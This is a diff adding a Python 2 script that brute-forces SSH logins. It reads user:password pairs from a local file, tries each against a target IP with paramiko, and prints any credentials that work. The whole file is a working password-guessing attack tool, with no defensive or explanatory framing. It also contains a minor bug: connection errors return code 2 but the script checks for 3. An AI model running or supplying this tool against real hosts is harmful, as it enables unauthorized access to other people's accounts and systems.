@@ -1,0 +1,47 @@
+#!/usr/bin/env python2
+
+import paramiko, sys, os, socket
+
+def conn(ssh, host, user, passwd, code=0):
+	try:
+		ssh.connect(host, port=22, username=user, password=passwd)
+	except paramiko.AuthenticationException:
+		code=1
+	except socket.error, e:
+		code=2
+	except KeyboardInterrupt:
+		print("Aborted ...")
+		sys.exit(3)
+	return code
+
+if __name__ == "__main__":
+
+	if len(sys.argv) > 1:
+			host=sys.argv[1]
+	else:
+		try:
+			host = raw_input("Target IP: ")
+
+		except KeyboardInterrupt:
+			print("Aborted ...")
+			sys.exit(3)
+
+	try:
+		pwfile=open('passwd')
+		ssh = paramiko.SSHClient()
+		ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+		for line in pwfile:
+			l = line.split(":")
+			u = l[0].strip()
+			p = l[1].strip()
+			res = conn(ssh, host, u, p)
+			if res == 0:
+				print("++ LOGIN! Host: %s User: %s Pass: %s" % (host, u, p))
+				sys.exit(0)
+			elif res == 1:
+				print("-- FAIL! Host: %s User: %s Pass: %s" % (host, u, p))
+			elif res == 3:
+				print("!! Unable to connect: %s" % (host))
+				sys.exit(2)
+	except Exception, e:
+			print e
